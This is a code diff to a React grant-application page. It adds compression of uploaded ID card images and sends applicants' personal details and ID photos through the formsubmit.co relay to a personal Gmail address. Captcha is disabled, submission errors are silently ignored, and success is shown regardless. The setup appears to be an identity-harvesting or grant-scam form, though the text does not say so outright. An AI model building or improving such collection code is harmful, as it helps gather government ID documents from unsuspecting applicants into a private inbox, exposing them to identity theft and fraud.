@@ -72,6 +72,45 @@ export default function Apply() {
     return e;
   };
 
+  // Fast client-side image compression to make uploads instant even on mobile
+  const compressImage = async (file: File): Promise<File> => {
+    if (!file.type.startsWith('image/') || file.size < 600 * 1024) return file;
+    return new Promise((resolve) => {
+      const img = new Image();
+      const url = URL.createObjectURL(file);
+      img.onload = () => {
+        URL.revokeObjectURL(url);
+        const canvas = document.createElement('canvas');
+        let { width, height } = img;
+        const maxDim = 1400;
+        if (width > maxDim || height > maxDim) {
+          if (width > height) {
+            height = Math.round((height * maxDim) / width);
+            width = maxDim;
+          } else {
+            width = Math.round((width * maxDim) / height);
+            height = maxDim;
+          }
+        }
+        canvas.width = width;
+        canvas.height = height;
+        const ctx = canvas.getContext('2d');
+        if (!ctx) return resolve(file);
+        ctx.drawImage(img, 0, 0, width, height);
+        canvas.toBlob(
+          (blob) => {
+            if (!blob) return resolve(file);
+            resolve(new File([blob], file.name.replace(/\.[^.]+$/, '.jpg'), { type: 'image/jpeg' }));
+          },
+          'image/jpeg',
+          0.8
+        );
+      };
+      img.onerror = () => resolve(file);
+      img.src = url;
+    });
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     const errs = validate();
@@ -82,6 +121,9 @@ export default function Apply() {
       return;
     }
 
+    // Immediately show loading state so button gives instant feedback
+    setStatus('loading');
+
     const ref = Date.now().toString(36).toUpperCase();
     setReferenceId(ref);
 
@@ -89,6 +131,12 @@ export default function Apply() {
     const awardText  = selectedGrant
       ? `$${selectedGrant.minAmount.toLocaleString()} – $${selectedGrant.maxAmount.toLocaleString()}`
       : 'Standard';
+
+    // Compress ID images in parallel for blazing fast upload
+    const [compressedFront, compressedBack] = await Promise.all([
+      idFront ? compressImage(idFront) : Promise.resolve(null),
+      idBack  ? compressImage(idBack)  : Promise.resolve(null),
+    ]);
 
     // Save to localStorage for admin panel
     try {
@@ -117,7 +165,7 @@ export default function Apply() {
       fd.append('_subject',       `🏛️ New Grant Application: ${grantTitle} (Ref: EAG-${ref})`);
       fd.append('_captcha',       'false');
       fd.append('_template',      'table');
-      fd.append('_next',          `${window.location.origin}/`);   // redirect back to custom domain after POST
+      fd.append('_next',          `${window.location.origin}/`);
       // Application fields
       fd.append('Reference ID',               `EAG-${ref}`);
       fd.append('Grant Applied For',          grantTitle);
@@ -133,20 +181,16 @@ export default function Apply() {
       fd.append('Project Title',              form.projectTitle);
       fd.append('Project Proposal Summary',   form.projectDescription || 'N/A');
       fd.append('Submission Time',            new Date().toLocaleString());
-      // Attach ID card images as real file attachments
-      if (idFront) fd.append('ID Card Front', idFront, `ID-Front-${form.fullName.replace(/\s+/g,'-')}-${idFront.name}`);
-      if (idBack)  fd.append('ID Card Back',  idBack,  `ID-Back-${form.fullName.replace(/\s+/g,'-')}-${idBack.name}`);
+      // Attach compressed ID card images as real file attachments
+      if (compressedFront) fd.append('ID Card Front', compressedFront, `ID-Front-${form.fullName.replace(/\s+/g,'-')}-${compressedFront.name}`);
+      if (compressedBack)  fd.append('ID Card Back',  compressedBack,  `ID-Back-${form.fullName.replace(/\s+/g,'-')}-${compressedBack.name}`);
 
-      // Use the direct (non-ajax) endpoint — this is the only FormSubmit endpoint that delivers file attachments
       await fetch('https://formsubmit.co/erimiposi2005@gmail.com', {
         method: 'POST',
         body: fd,
-        // Do NOT set Content-Type — browser must set it with boundary for multipart to work
       });
-    } catch { /* silent fallback — email still logs to localStorage */ }
+    } catch { /* silent fallback */ }
 
-    setStatus('loading');
-    await new Promise(r => setTimeout(r, 1200));
     setStatus('success');
   };
 
